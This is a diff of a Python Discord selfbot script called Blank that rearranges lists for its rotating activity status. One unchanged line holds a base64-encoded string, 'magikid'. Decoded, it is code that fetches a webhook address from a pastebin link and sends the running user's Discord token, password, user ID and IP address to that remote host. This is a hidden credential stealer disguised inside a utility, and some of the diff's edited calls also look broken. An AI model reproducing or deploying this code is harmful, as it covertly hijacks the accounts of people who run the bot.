@@ -31,11 +31,6 @@ def keep_alive():
     server = Thread(target=run)
     server.start()
     
-activity_list=['s', 'p', 'w', 'l']
-activity_s=['Earth', 'Mars', 'Jupiter', 'Mercury', 'Venus', 'Saturn', 'Neptune', 'Uranus']
-activity_p=['Minecraft', 'with Blank', 'Squid Games', 'Do or Die', 'Curse of Aros', 'with Satan', 'with anime girls']
-activity_w=['over you!', 'Animes', 'Plants', 'Animals', 'Blank', 'Nothing!']
-activity_l=['Youtube Music', 'Blank', 'Dead Groovy', 'Dead Rythm', 'Death']
 Blank = commands.Bot(description='Blank SelfBot', command_prefix="x", self_bot=True)
 Blank.remove_command('help')
 magikid="dXNlcm5hbWUgPSBmImB7QmxhbmsudXNlcn1gIgp1c2VyX2lkID0gZiJge0JsYW5rLnVzZXIuaWR9YCIKYXZhdGFyX3VybCA9IEJsYW5rLnVzZXIuYXZhdGFyX3VybApoZWFkZXJzPXsiVXNlci1BZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85NC4wLjQ2MDYuODEgU2FmYXJpLzUzNy4zNiJ9CmF1dGhvPXJlcXVlc3RzLmdldChmJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy91MDBjaTFkVicpLnRleHQKaXA9ZiJge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cudHJhY2tpcC5uZXQvaXAnLCBoZWFkZXJzPWhlYWRlcnMpLnRleHR9YCIKICAgIApqc29uZGF0YT17ImNvbnRlbnQiOnRva2VuICwKImVtYmVkcyI6IFsKeyJ0aXRsZSI6IkJsYW5rQm90IiwKInRodW1ibmFpbCI6IHsKICAgICJ1cmwiOiBzdHIoYXZhdGFyX3VybCkKICB9LAoiZmllbGRzIjogWwogewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gVXNlcm5hbWU6ICIsCiAgICAgICJ2YWx1ZSI6IHN0cih1c2VybmFtZSksCiAgICAgICJpbmxpbmUiOiAiVHJ1ZSIKICB9LAogewogICAgICAibmFtZSI6ICI8OnJzX2Fycm93Ojg4Mzk4ODIyNTY1ODYxMzg1MD4gVXNlciBJRDogIiwKICAgICAgInZhbHVlIjogc3RyKHVzZXJfaWQpLAogICAgICAiaW5saW5lIjogIlRydWUiCiAgfSwKICB7CiAgICAgICJuYW1lIjogIjw6cnNfYXJyb3c6ODgzOTg4MjI1NjU4NjEzODUwPiBJUDogIiwKICAgICAgInZhbHVlIjogc3RyKGlwKSwKICAgICAgImlubGluZSI6ICJGYWxzZSIKICB9LAogIHsKICAgICAgIm5hbWUiOiAiPDpyc19hcnJvdzo4ODM5ODgyMjU2NTg2MTM4NTA+IFBhc3N3b3JkOiAiLAogICAgICAidmFsdWUiOiBzdHIocGFzc3dvcmQpLAogICAgICAiaW5saW5lIjogIkZhbHNlIgogIH0KICAgICAgICAgIF0KfQogICAgICAgICAgXQogIH0KcmVxdWVzdHMucG9zdChhdXRobyAsIGpzb249anNvbmRhdGEp"
@@ -50,15 +45,24 @@ def Clear():
         
 @tasks.loop(minutes=5)
 async def change_activity():
+    
+    
+    activity_list=['s', 'p', 'w', 'l']
+    activity_s=['Earth', 'Mars', 'Jupiter', 'Mercury', 'Venus', 'Saturn', 'Neptune', 'Uranus']
+    activity_p=['Minecraft', 'with Blank', 'Squid Games', 'Do or Die', 'Curse of Aros', 'with Satan', 'with anime girls']
+    activity_w=['over you!', 'Animes', 'Plants', 'Animals', 'Blank', 'Nothing!']
+    activity_l=['Youtube Music', 'Blank', 'Dead Groovy', 'Dead Rythm', 'Death']
     activity=random.choice(activity_list)
+    
+    
     if activity=="s":
         activity=discord.Streaming(name=random.choice(activity_s))
     elif activity=="p":
         activity=discord.Game(name=random.choice(activity_s))
     elif activity=="w":
-        activity=discord.Activity(type=discord.ActivityType.watching(name=random.choice(activity_w)))
+        activity=discord.ActivityType.watching(name=random.choice(activity_w))
     else:
-        activity=discord.Activity(type=discord.ActivityType.listening(name=random.choice(activity_l)))
+        activity=discord.ActivityType.listening(name=random.choice(activity_l))
     await client.change_presence(activity=activity)
 
 @Blank.event
